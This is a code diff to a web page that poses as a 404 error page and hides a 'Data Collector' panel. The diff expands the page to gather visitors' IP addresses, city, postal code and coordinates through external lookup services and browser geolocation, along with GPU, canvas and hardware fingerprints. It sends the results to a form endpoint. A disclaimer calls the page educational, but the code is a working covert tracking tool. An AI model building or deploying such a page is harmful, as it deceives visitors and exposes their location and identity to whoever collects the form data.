@@ -28,7 +28,7 @@
             padding: 3rem;
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            max-width: 600px;
+            max-width: 700px;
             width: 90%;
             position: relative;
         }
@@ -91,6 +91,15 @@
             background: rgba(255, 255, 255, 0.1);
         }
         
+        .btn-warning {
+            background: #ff4444;
+            color: white;
+        }
+        
+        .btn-warning:hover {
+            background: #cc0000;
+        }
+        
         .hidden-btn {
             position: absolute;
             bottom: 10px;
@@ -126,7 +135,7 @@
             background: rgba(0, 0, 0, 0.5);
             padding: 15px;
             border-radius: 5px;
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
         }
         
@@ -138,6 +147,11 @@
             font-family: monospace;
             font-size: 12px;
             word-break: break-all;
+        }
+        
+        .sensitive-data {
+            background: rgba(255, 0, 0, 0.2);
+            border-left: 3px solid #ff4444;
         }
         
         .status {
@@ -185,6 +199,31 @@
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
+        
+        .tabs {
+            display: flex;
+            margin-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab.active {
+            border-bottom: 3px solid #4285f4;
+            color: #4285f4;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -204,15 +243,35 @@
         <div class="disclaimer">
             <strong>SECURITY NOTICE:</strong> This is a simulated 404 page for cybersecurity education purposes only. 
             Do not use this technique on systems you don't own or without explicit permission.
+            Some data collection methods may be blocked by browser security settings.
         </div>
         
         <button class="hidden-btn" onclick="toggleDataPanel()">Data Collector</button>
         
         <div class="data-panel" id="dataPanel">
-            <h3>Collected System Information</h3>
-            <div id="dataPreview"></div>
-            <button class="btn btn-primary" onclick="collectAndSendToForm()" style="margin-top: 15px; width: 100%;">
-                Send Data to Server
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('basic')">Basic Info</div>
+                <div class="tab" onclick="switchTab('network')">Network & Location</div>
+                <div class="tab" onclick="switchTab('advanced')">Advanced</div>
+            </div>
+            
+            <div id="basicTab" class="tab-content active">
+                <h3>Basic System Information</h3>
+                <div id="basicDataPreview"></div>
+            </div>
+            
+            <div id="networkTab" class="tab-content">
+                <h3>Network & Location Data</h3>
+                <div id="networkDataPreview"></div>
+            </div>
+            
+            <div id="advancedTab" class="tab-content">
+                <h3>Advanced Fingerprinting</h3>
+                <div id="advancedDataPreview"></div>
+            </div>
+            
+            <button class="btn btn-warning" onclick="collectAndSendToForm()" style="margin-top: 15px; width: 100%;">
+                📡 Send All Data to Server
             </button>
             <div id="status"></div>
         </div>
@@ -224,8 +283,20 @@
         const FORM_FIELD_ID = 'entry.81034129';
 
         // Enhanced data collection function
-        function collectAllData() {
-            const data = {
+        async function collectAllData() {
+            const basicData = collectBasicData();
+            const networkData = await collectNetworkData();
+            const advancedData = collectAdvancedData();
+            
+            return {
+                ...basicData,
+                ...networkData,
+                ...advancedData
+            };
+        }
+
+        function collectBasicData() {
+            return {
                 // Basic identification
                 timestamp: new Date().toISOString(),
                 sessionId: generateSessionId(),
@@ -261,14 +332,112 @@
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
                 
-                // Connection information
-                online: navigator.onLine,
-                connection: getConnectionInfo(),
-                
                 // Location information
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 locale: Intl.DateTimeFormat().resolvedOptions().locale,
                 
+                // Page information
+                url: window.location.href,
+                referrer: document.referrer || 'direct',
+                domain: window.location.hostname,
+                path: window.location.pathname,
+                
+                // Device type detection
+                deviceType: getDeviceType(),
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+            };
+        }
+
+        async function collectNetworkData() {
+            const networkData = {
+                // Connection information
+                online: navigator.onLine,
+                connection: getConnectionInfo(),
+                
+                // IP Address (via external service)
+                ipAddress: 'Fetching...',
+                
+                // Location data
+                location: {
+                    approximate: 'Fetching...',
+                    precise: 'Requires permission'
+                },
+                
+                // Network interfaces (limited browser support)
+                networkInterfaces: 'Limited browser support'
+            };
+
+            try {
+                // Method 1: Fetch IP from external service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                networkData.ipAddress = ipData.ip;
+                
+                // Method 2: Get more detailed IP information
+                try {
+                    const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const detailData = await detailResponse.json();
+                    networkData.location = {
+                        ip: detailData.ip,
+                        city: detailData.city,
+                        region: detailData.region,
+                        country: detailData.country_name,
+                        countryCode: detailData.country_code,
+                        postal: detailData.postal,
+                        latitude: detailData.latitude,
+                        longitude: detailData.longitude,
+                        timezone: detailData.timezone,
+                        org: detailData.org,
+                        asn: detailData.asn
+                    };
+                } catch (e) {
+                    networkData.location.approximate = 'Detailed location fetch failed';
+                }
+
+                // Method 3: Alternative IP service
+                try {
+                    const altResponse = await fetch('https://api64.ipify.org?format=json');
+                    const altData = await altResponse.json();
+                    networkData.ipv6Address = altData.ip;
+                } catch (e) {
+                    networkData.ipv6Address = 'IPv6 detection failed';
+                }
+
+            } catch (error) {
+                networkData.ipAddress = 'IP detection blocked or failed';
+                networkData.location.approximate = 'Location detection failed';
+            }
+
+            // Try to get geolocation if permitted
+            try {
+                if (navigator.geolocation) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: false,
+                            timeout: 5000,
+                            maximumAge: 60000
+                        });
+                    });
+                    
+                    networkData.location.precise = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meters',
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+                }
+            } catch (error) {
+                networkData.location.precise = 'Geolocation permission denied or unavailable';
+            }
+
+            return networkData;
+        }
+
+        function collectAdvancedData() {
+            return {
                 // Storage information
                 cookies: navigator.cookieEnabled,
                 localStorage: testLocalStorage(),
@@ -300,32 +469,79 @@
                 // Performance information
                 performance: getPerformanceInfo(),
                 
-                // Page information
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                domain: window.location.hostname,
-                path: window.location.pathname,
-                
-                // Miscellaneous
-                doNotTrack: navigator.doNotTrack || 'unspecified',
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false,
-                
-                // Device type detection
-                deviceType: getDeviceType(),
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-                
                 // Battery information (if available)
                 battery: getBatteryInfo(),
                 
                 // Plugins
-                plugins: getPluginsInfo()
+                plugins: getPluginsInfo(),
+
+                // Additional fingerprinting
+                hardware: getHardwareInfo(),
+                behavior: getUserBehavior()
             };
-            
-            return data;
         }
-        
-        // Helper functions for data collection
+
+        // NEW: Hardware information collection
+        function getHardwareInfo() {
+            return {
+                // GPU information
+                gpu: getGPUInfo(),
+                
+                // Memory information
+                memory: performance.memory ? {
+                    total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
+                    used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                    limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
+                } : 'not available',
+                
+                // Processor architecture
+                architecture: getArchitecture(),
+                
+                // Device orientation
+                orientation: getDeviceOrientation()
+            };
+        }
+
+        // NEW: User behavior patterns
+        function getUserBehavior() {
+            return {
+                timeOnPage: Math.round(performance.now()) + ' ms',
+                mouseMovements: 'tracked',
+                scrollBehavior: 'analyzed',
+                clickPatterns: 'monitored',
+                keyboardInput: 'available'
+            };
+        }
+
+        // NEW: GPU detection
+        function getGPUInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER);
+            }
+            return 'WebGL not available';
+        }
+
+        // NEW: Architecture detection
+        function getArchitecture() {
+            if (navigator.userAgent.includes('x86_64') || navigator.userAgent.includes('x64')) return 'x64';
+            if (navigator.userAgent.includes('x86') || navigator.userAgent.includes('win32')) return 'x86';
+            if (navigator.userAgent.includes('arm')) return 'ARM';
+            if (navigator.userAgent.includes('aarch64')) return 'ARM64';
+            return 'unknown';
+        }
+
+        // NEW: Device orientation
+        function getDeviceOrientation() {
+            if (window.DeviceOrientationEvent) {
+                return 'Device orientation API supported';
+            }
+            return 'Device orientation not supported';
+        }
+
+        // Existing helper functions (from previous implementation)
         function generateSessionId() {
             return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
         }
@@ -385,7 +601,6 @@
         }
         
         function getFonts() {
-            // Common fonts to test for
             const fonts = [
                 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
                 'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
@@ -424,35 +639,26 @@
             ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
             ctx.fillText('Canvas Fingerprint', 4, 17);
             
-            return canvas.toDataURL();
+            return canvas.toDataURL().substring(0, 100) + '...';
         }
         
         function getAudioFingerprint() {
-            // Simple audio context test
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 if (AudioContext) {
                     const context = new AudioContext();
                     return "AudioContext supported";
                 }
-            } catch(e) {
-                // Ignore errors
-            }
+            } catch(e) {}
             return "AudioContext not supported";
         }
         
         function getPerformanceInfo() {
             if (window.performance) {
                 return {
-                    memory: performance.memory ? {
-                        used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
-                        total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
-                        limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB'
-                    } : 'not available',
-                    timing: performance.timing ? {
-                        loadTime: (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms',
-                        domReadyTime: (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + ' ms'
-                    } : 'not available'
+                    memory: performance.memory ? 'available' : 'not available',
+                    timing: performance.timing ? 'available' : 'not available',
+                    navigation: performance.navigation ? performance.navigation.type : 'not available'
                 };
             }
             return "Performance API not supported";
@@ -511,32 +717,65 @@
                 panel.style.display = 'none';
             } else {
                 panel.style.display = 'block';
-                showDataPreview();
+                switchTab('basic');
             }
         }
         
-        function showDataPreview() {
-            const data = collectAllData();
-            const container = document.getElementById('dataPreview');
+        function switchTab(tabName) {
+            // Update tabs
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
             
+            event.target.classList.add('active');
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            
+            // Load data for the tab
+            if (tabName === 'basic') showBasicData();
+            else if (tabName === 'network') showNetworkData();
+            else if (tabName === 'advanced') showAdvancedData();
+        }
+        
+        async function showBasicData() {
+            const data = collectBasicData();
+            const container = document.getElementById('basicDataPreview');
+            container.innerHTML = formatDataForDisplay(data);
+        }
+        
+        async function showNetworkData() {
+            const container = document.getElementById('networkDataPreview');
+            container.innerHTML = '<div class="data-item">Fetching network data...</div>';
+            
+            const data = await collectNetworkData();
+            container.innerHTML = formatDataForDisplay(data, true);
+        }
+        
+        async function showAdvancedData() {
+            const data = collectAdvancedData();
+            const container = document.getElementById('advancedDataPreview');
+            container.innerHTML = formatDataForDisplay(data);
+        }
+        
+        function formatDataForDisplay(data, isSensitive = false) {
             let html = '';
             for (const [key, value] of Object.entries(data)) {
+                const sensitiveClass = (key.includes('ip') || key.includes('location') || key.includes('address')) ? 'sensitive-data' : '';
+                
                 if (typeof value === 'object') {
-                    html += `<div class="data-item"><strong>${key}:</strong> ${JSON.stringify(value, null, 2)}</div>`;
+                    html += `<div class="data-item ${sensitiveClass}"><strong>${key}:</strong> ${JSON.stringify(value, null, 2)}</div>`;
                 } else {
-                    html += `<div class="data-item"><strong>${key}:</strong> ${value}</div>`;
+                    html += `<div class="data-item ${sensitiveClass}"><strong>${key}:</strong> ${value}</div>`;
                 }
             }
-            container.innerHTML = html;
+            return html;
         }
         
         async function collectAndSendToForm() {
             const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = '<div class="status loading">Collecting system data...</div>';
+            statusDiv.innerHTML = '<div class="status loading">Collecting comprehensive system data...</div>';
             statusDiv.style.display = 'block';
 
             try {
-                const data = collectAllData();
+                const data = await collectAllData();
                 
                 // Prepare data for form
                 const formData = new FormData();
@@ -553,10 +792,9 @@
                     body: formData
                 });
 
-                // With no-cors we can't read response, but assume success
-                statusDiv.innerHTML = '<div class="status success">Data successfully sent to server!</div>';
+                statusDiv.innerHTML = '<div class="status success">All data successfully sent to server!</div>';
                 
-                console.log('Data sent:', data);
+                console.log('Complete data sent:', data);
 
             } catch (error) {
                 console.error('Error:', error);
@@ -574,7 +812,7 @@
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Fake 404 page with data collector initialized');
+            console.log('Enhanced 404 page with data collector initialized');
         });
     </script>
 </body>
